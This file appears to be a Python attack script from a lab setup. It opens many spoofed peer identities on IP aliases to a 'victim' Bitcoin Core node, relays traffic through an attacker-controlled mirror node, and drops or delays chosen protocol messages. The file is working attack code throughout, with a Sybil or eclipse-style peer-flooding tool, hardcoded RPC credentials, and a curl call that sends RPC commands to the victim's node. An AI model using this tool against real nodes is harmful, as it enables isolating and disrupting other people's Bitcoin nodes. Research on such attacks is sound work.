import threading
from bitcoin.messages import *
from bitcoin.net import CAddress
from io import BytesIO as _BytesIO
import atexit
import bitcoin
import fcntl
import hashlib
import json
import os
import random
import re
import socket
import struct
import sys
import time


# Specify the attacker's genuine IP
attacker_ip = '10.0.2.' + str(int(input('Attacker IP = 10.0.2.X, what is X? ')))
attacker_port = 8333

# Specify the victim's IP, and port (8333 for Bitcoin)
victim_ip = '10.0.2.' + str(int(input('Victim IP = 10.0.2.X, what is X? ')))
victim_port = 8333

# How many identities should run simultaneously
num_identities = int(input('How many identities would you like? '))
percentage_to_drop = float(input(f'What is the packet drop rate (0 to 1)? '))

seconds_delay = { # -1 to drop the packet
	'version': -1,
	'verack': -1,
	'addr': 0,
	'inv': 0,
	'getdata': 0,
	'merkleblock': 0,
	'getblocks': 0,
	'getheaders': 0,
	'tx': 0,
	'headers': 0,
	'block': 0,
	'getaddr': 0,
	'mempool': 0,
	'ping': 0,
	'pong': 0,
	'notfound': 0,
	'filterload': 0,
	'filteradd': 0,
	'filterclear': 0,
	'sendheaders': 0,
	'feefilter': 0,
	'sendcmpct': 0,
	'cmpctblock': 0,
	'getblocktxn': 0,
	'blocktxn': 0,
	'reject': 0,
	'undocumented': 0
}







identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
identity_address = [] # Keeps the IP and port for each successful connection
identity_socket = [] # Keeps the socket for each successful connection
identity_mirror_socket = [] # The mirrored internal connections to Bitcoin Core

# The file where the iptables backup is saved, then restored when the script ends
#iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
# Keeps track of all threads
threads = []

# Send commands to the Linux terminal
def terminal(cmd):
	return os.popen(cmd).read()

# Send commands to the Bitcoin Core Console
def bitcoin(cmd):
	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()

# Send commands to the Victim's Bitcoin Core Console
def bitcoinVictim(cmd):
	return os.popen('curl --data-binary \'{"jsonrpc":"1.0","id":"curltext","method":"' + cmd + '","params":[]}\' -H \'content-type:text/plain;\' http://cybersec:kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame@' + victim_ip + ':8332').read()

# Generate a random identity using the broadcast address template
def random_ip():
	# By forcing the IP to be above a certain threshhold, it prevents a lot of errors
	minimum_ip_range = min(int(attacker_ip.split('.')[-1]), int(victim_ip.split('.')[-1])) + 1
	while(True):
		ip = broadcast_address
		old_ip = ''
		while(old_ip != ip):
			old_ip = ip
			ip = ip.replace('255', str(random.randint(minimum_ip_range, 255)), 1)
		# Don't accept already assigned IPs
		if ip == default_gateway: continue
		if ip == victim_ip: continue
		if ip not in [x[0] for x in identity_address]: break
	return ip
	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'

# Checking the internet by sending a single ping to Google
def internet_is_active():
	return os.system('ping -c 1 google.com') == 0

# If all else fails, we can use this to recover the network
def reset_network():
	print('Resetting network...')
	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')

# Create an alias for a specified identity
def ip_alias(ip_address):
	global alias_num
	print(f'Setting up IP alias {ip_address} on {network_interface}')
	interface = f'{network_interface}:{alias_num}'
	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
	alias_num += 1
	return interface

# Construct a version packet using python-bitcoinlib
def version_packet(src_ip, dst_ip, src_port, dst_port):
	msg = msg_version(bitcoin_protocolversion)
	msg.nVersion = bitcoin_protocolversion
	msg.addrFrom.ip = src_ip
	msg.addrFrom.port = src_port
	msg.addrTo.ip = dst_ip
	msg.addrTo.port = dst_port
	# Default is /python-bitcoinlib:0.11.0/
	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
	return msg

# Construct a ping packet using python-bitcoinlib
def ping_packet():
	msg = msg_ping(bitcoin_protocolversion)
	msg.nonce = random.getrandbits(32)
	return msg

# Close a connection
def close_connection(socket, ip, port, interface):
	successful = True
	try:
		socket.close()
	except: successful = False
	terminal(f'sudo ifconfig {interface} {ip} down')
	if socket in identity_socket: identity_socket.remove(socket)
	del socket
	if interface in identity_interface: identity_interface.remove(interface)
	if (ip, port) in identity_address: identity_address.remove((ip, port))
	print(f'Successfully closed connection to ({ip} : {port})')

# Creates a fake connection to the victim
def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
	if attempt_number == 0: return

	src_port = random.randint(1024, 65535)
	dst_port = victim_port
	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')

	interface = ip_alias(src_ip)
	identity_interface.append(interface)
	if verbose: print(f'Successfully set up IP alias on interface {interface}')
	if verbose: print('Resulting ifconfig interface:')
	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')

	#if verbose: print('Setting up iptables configurations')
	#terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
	#terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
	#terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
	#terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')

	if verbose: print('Creating network socket...')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		if verbose: print(f'Setting socket network interface to "{network_interface}"...')
		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
		while success == -1:
			print(f'Setting socket network interface to "{network_interface}"...')
			success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))

		if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
		s.bind((src_ip, src_port))
	except:
		print('Failed to bind ip to victim')
		time.sleep(1)
		close_connection(s, src_ip, src_port, interface)
		time.sleep(10)
		rand_ip = random_ip()
		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
		return

	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
	try:
		s.connect((dst_ip, dst_port))
	except:
		print('Failed to connect to victim')
		time.sleep(1)
		close_connection(s, src_ip, src_port, interface)
		time.sleep(10)
		rand_ip = random_ip()
		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
		return

	temp_listener = None
	try:
		# Send version packet
		version = version_packet(src_ip, dst_ip, src_port, dst_port)
		s.sendall(version.to_bytes())
		# Get verack packet
		verack = s.recv(1924)
		# Send verack packet
		verack = msg_verack(bitcoin_protocolversion)
		s.sendall(verack.to_bytes())
		# Get verack packet
		verack = s.recv(1024)
		if verbose: print(f'Attaching temporary packet listeners to {interface}')
		temp_listener = create_task(True, 'Temp victim identity ' + src_ip, temp_sniff, s, None, src_ip, src_port, dst_ip, dst_port, interface)
		# Send a ping
		#s.sendall(ping_packet().to_bytes())
	except:
		print('Failed to send packets to victim')
		time.sleep(1)
		if temp_listener != None: temp_listener.stop()
		close_connection(s, src_ip, src_port, interface)
		time.sleep(10)
		rand_ip = random_ip()
		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, True, attempt_number - 1)
		return

	if verbose: print('Connection successful!')

	identity_address.append((src_ip, src_port))
	identity_socket.append(s)


	mirror_socket = mirror_make_fake_connection(interface, src_ip, verbose)
	if mirror_socket != None:
		identity_mirror_socket.append(mirror_socket)
	# Listen to the connections for future packets
	if mirror_socket != None:
		if verbose: print(f'Attaching packet listeners to {interface}')
		if temp_listener != None: temp_listener.stop()
		create_task(True, 'Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
		create_task(True, 'Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)

# Reconnect a peer
def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):

	close_connection(the_socket, src_ip, src_port, interface)
	close_connection(other_socket, dst_ip, dst_port, interface)
	#make_fake_connection(src_ip = random_ip(), dst_ip, verbose=True, attempt_number = 3)
	time.sleep(1)
	try:
		# With attempt_number == -1, it will retry to connect infinitely
		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
	except ConnectionRefusedError:
		print('Connection was refused. The victim\'s node must not be running.')

# Creates a fake connection to the victim
def mirror_make_fake_connection(interface, src_ip, verbose=True):
	src_port = random.randint(1024, 65535)
	dst_ip = attacker_ip
	dst_port = 8333
	print(f'Creating mirrored identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')

	if verbose: print('Creating network socket...')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
	while success == -1:
		print(f'Setting socket network interface to "{network_interface}"...')
		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))

	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
	s.bind((src_ip, src_port))

	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
	try:
		s.connect((dst_ip, dst_port))
	except:
		print('Failed to connect to our mirrored node')
		return None

	# Send version packet
	version = version_packet(src_ip, dst_ip, src_port, dst_port)
	s.sendall(version.to_bytes())
	# Get verack packet
	verack = s.recv(1924)
	# Send verack packet
	verack = msg_verack(bitcoin_protocolversion)
	s.sendall(verack.to_bytes())
	# Get verack packet
	verack = s.recv(1024)
	# Send a ping
	#s.sendall(ping_packet().to_bytes())
	if verbose: print('Mirrored connection successful!')
	return s

# Same as sniff, but doesn't disconnect after stopping
def temp_sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
	while not thread.stopped():
		try:
			packet, address = socket.recvfrom(65565)
			create_task(True, 'Process temp packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
		except: time.sleep(1)

def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
	global closingApplication
	while not thread.stopped():
		try:
			packet, address = socket.recvfrom(65565)
			create_task(True, 'Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
		except: time.sleep(1)
	#reconnect(socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
	if not closingApplication:
		create_task(False, 'Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff)
	#close_connection(socket, dst_ip, dst_port, interface)

def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
	global closingApplication
	while not thread.stopped():
		try:
			packet, address = socket.recvfrom(65565)
			if random.random() >= percentage_to_drop:
				create_task(True, 'Process mirror packet ' + src_ip, mirror_packet_received, thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
			else:
				pass # Dropped packet
		except: time.sleep(1)
	#reconnect(socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
	if not closingApplication:
		create_task(False, 'Reconnecting ' + victim_ip, reconnect, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, mirror_sniff)
	#close_connection(socket, src_ip, src_port, interface)

# Called when a packet is sniffed from the network
# Return true to end the thread
def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
	if parent_thread.stopped(): return
	from_ip = dst_ip
	from_port = dst_port
	to_ip = src_ip
	to_port = src_port

	if len(packet) >= 4:
		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
	else:
		is_bitcoin = False

	if is_bitcoin and len(packet) >= 4+12+4+4:
		msg_type = packet[4 : 4+12].split(b"\x00", 1)[0].decode()
		payload_length = struct.unpack(b'<i', packet[4+12 : 4+12+4])[0]
		payload_checksum = hashlib.sha256(hashlib.sha256(packet[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
		payload_valid = (packet[4+12+4 : 4+12+4+4] == payload_checksum)
		payload_length_valid = (len(packet) - payload_length == 4+12+4+4)
		# The payload is packet[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
	else:
		msg_type = ''
		payload_length = 0
		payload_valid = False
		payload_length_valid = False

	if not is_bitcoin: return
	if not payload_valid: return
	if not payload_length_valid: return


	# Relay Bitcoin packets that aren't from the victim
	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')

	if msg_type == 'ping':
		if socket == None: return # If the destination socket isn't running, ignore packet
		# Parse the message payload
		msg = MsgSerializable.from_bytes(packet)

		pong = msg_pong(bitcoin_protocolversion)
		pong.nonce = msg.nonce
		try: # src --> dst
			socket.sendall(pong.to_bytes())
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({victim_ip} : {victim_port})')
			#create_task(False, 'Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)

		"""if mirror_socket == None: return # If the destination socket isn't running, ignore packet
		ping = msg_ping(bitcoin_protocolversion)
		ping.nonce = random.getrandbits(32)
		try: # src --> dst
			mirror_socket.sendall(ping.to_bytes())
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
			#create_task(False, 'Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
		"""
	elif msg_type == 'pong': pass # Ignore version
	elif msg_type == 'version': pass # Ignore version
	elif msg_type == 'verack': pass # Ignore verack
	else:
		if mirror_socket == None: return # If the destination socket isn't running, ignore packet
		try: # src --> attacker
			mirror_socket.sendall(packet) # Relay to the mirror
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
			#create_task(False, 'Reconnecting ' + attacker_ip, reconnect, mirror_socket, socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)

	return True

# Called when a packet is sniffed from the network
# Return true to end the thread

def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
	if parent_thread.stopped(): return
	from_ip = src_ip
	from_port = src_port
	to_ip = dst_ip
	to_port = dst_port

	if len(packet) >= 4:
		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
	else:
		is_bitcoin = False

	if is_bitcoin and len(packet) >= 4+12+4+4:
		msg_type = packet[4 : 4+12].split(b"\x00", 1)[0].decode()
		payload_length = struct.unpack(b'<i', packet[4+12 : 4+12+4])[0]
		payload_checksum = hashlib.sha256(hashlib.sha256(packet[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
		payload_valid = (packet[4+12+4 : 4+12+4+4] == payload_checksum)
		payload_length_valid = (len(packet) - payload_length == 4+12+4+4)
		# The payload is packet[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
	else:
		msg_type = ''
		payload_length = 0
		payload_valid = False
		payload_length_valid = False


	if not is_bitcoin: return
	if not payload_valid: return
	if not payload_length_valid: return

	# Relay Bitcoin packets that aren't from the victim
	if msg_type in seconds_delay:
		if seconds_delay[msg_type] == -1:
			print(f'*** *** Dropping packet  ** {from_ip} --> {to_ip} ** {msg_type}')
			return # Drop the packet
		if seconds_delay[msg_type] != 0:
			print(f'*** *** Delaying message by {seconds_delay[msg_type]} seconds ** {from_ip} --> {to_ip} ** {msg_type}')
			time.sleep(seconds_delay[msg_type])



	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
	if msg_type == 'ping':
		if socket == None: return False # If the destination socket isn't running, ignore packet
		# Parse the message payload
		msg = MsgSerializable.from_bytes(packet)
		pong = msg_pong(bitcoin_protocolversion)
		pong.nonce = msg.nonce
		try:
			socket.sendall(pong.to_bytes())
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
			#create_task(False, 'Reconnecting ' + attacker_ip, reconnect, socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)

		"""if orig_socket == None: return # If the destination socket isn't running, ignore packet
		ping = msg_ping(bitcoin_protocolversion)
		ping.nonce = random.getrandbits(32)
		try: # src --> dst
			orig_socket.sendall(ping.to_bytes())
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
			#create_task(False, 'Reconnecting ' + victim_ip, reconnect, orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
		"""
	elif msg_type == 'pong': pass
	else:
		if orig_socket == None: return False # If the destination socket isn't running, ignore packet
		try:
			orig_socket.sendall(packet) # Relay to the victim
		except Exception as e:
			parent_thread.stop()
			print(f'Lost connection to ({victim_ip} : {victim_port})')
			#create_task(False, 'Reconnecting ' + victim_ip, reconnect, orig_socket, socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)

		# print("Closing socket because of error: " + str(e))
		# parent_thread.stop()
		# socket.close()

	return True

# Initialize the network
def initialize_network_info():
	print('Retrieving network info...')
	global default_gateway, network_interface, broadcast_address

	# Get the network interface of the default gateway
	m = re.search(r'default +via +([^ ]+) +dev +([^ ]+)', terminal('ip route'))
	if m != None:
		default_gateway = m.group(1).strip()
		network_interface = m.group(2).strip()
	else:
		print('Error: Network interface couldn\'t be found.')
		sys.exit()

	# Get the broadcast address of the network interface
	# Used as an IP template of what can change, so that packets still come back to the sender
	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
	if m != None:
		broadcast_address = m.group(1).strip()
	else:
		print('Error: Network broadcast IP couldn\'t be found.')
		sys.exit()

# Initialize Bitcoin info
def initialize_bitcoin_info():
	print('Retrieving bitcoin info...')
	global bitcoin_subversion
	global bitcoin_protocolversion
	bitcoin_subversion = '/Satoshi:0.18.0/'
	bitcoin_protocolversion = 70015
	try:
		network_info = None #json.loads(bitcoin('getnetworkinfo'))
		if 'subversion' in network_info:
			bitcoin_subversion = network_info['subversion']
		if 'protocolversion' in network_info:
			bitcoin_protocolversion = network_info['protocolversion']
	except:
		pass

# Save a backyp of the iptable rules
#def backup_iptables():
#	terminal(f'iptables-save > {iptables_file_path}')

# Restore the backup of the iptable rules
#def cleanup_iptables():
#	if(os.path.exists(iptables_file_path)):
#		print('Cleaning up iptables configuration')
#		terminal(f'iptables-restore < {iptables_file_path}')
#		os.remove(iptables_file_path)

# Remove all ip aliases that were created by the script
def cleanup_ipaliases():
	for i in range(0, len(identity_address)):
		try: ip = identity_address[i][0]
		except: ip = None
		try: interface = identity_interface[i]
		except: interface = None
		if interface is not None and ip is not None:
			print(f'Cleaning up IP alias {ip} on {interface}')
			terminal(f'sudo ifconfig {interface} {ip} down')

# Run a fuction in parallel to other code
class Task(threading.Thread):
	def __init__(self, sendThreadAsFirstArg, name, function, *args):
		assert isinstance(name, str), 'Argument "name" is not a string'
		assert callable(function), 'Argument "function" is not callable'
		threading.Thread.__init__(self)
		self._stop_event = threading.Event()

		self.setName(name)
		self.function = function
		self.args = args
		self.send_thread = sendThreadAsFirstArg

	def __str__(self):
		return f'Task({self.name})'

	def run(self):
		if self.send_thread: self.function(self, *self.args)
		else: self.function(*self.args)

		self._stop_event.set()

	def stop(self):
		self._stop_event.set()

	def stopped(self):
		return self._stop_event.is_set()

# Creates a new thread and starts it
def create_task(sendThreadAsFirstArg, name, function, *args):
	if len(threads) >= 200:
		# Remove the first 10 threads if it exceeds 200, to balance it out
		for i in range(10):
			threads[i].stop()
			del threads[i]
	task = Task(sendThreadAsFirstArg, name, function, *args)
	threads.append(task)
	task.start()
	return task

# Remove any threads that are stopped
def purge_stopped_threads():
	active_threads = []
	for thread in threads:
		if not thread.stopped():
			active_threads.append(thread)
	threads = active_threads

# This function is ran when the script is stopped
def on_close():
	global closingApplication
	closingApplication = True
	print('Stopping active threads')
	for thread in threads:
		thread.stop()
	print('Closing open sockets')
	for socket in identity_socket:
		socket.close()
	cleanup_ipaliases()
	#cleanup_iptables()
	print('Cleanup complete. Goodbye.')

# This is the first code to run
if __name__ == '__main__':
	global alias_num, closingApplication
	closingApplication = False
	alias_num = 0 # Increments each alias

	initialize_network_info()
	initialize_bitcoin_info()

	atexit.register(on_close) # Make on_close() run when the script terminates
	#cleanup_iptables() # Restore any pre-existing iptables before backing up, just in case if the computer shutdown without restoring
	#backup_iptables()

	# Create the connections
	for i in range(1, num_identities + 1):
		try:
			# With attempt_number == -1, it will retry to connect infinitely
			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
		except ConnectionRefusedError:
			print('Connection was refused. The victim\'s node must not be running.')

	print(f'\nSUCCESSFUL CONNECTIONS: {len(identity_address)}\n')

	# Wait for all threads (sniffers) to end before ending the main thread
	#map(lambda thread: thread.join(), threads)
	while(True):
		time.sleep(60)
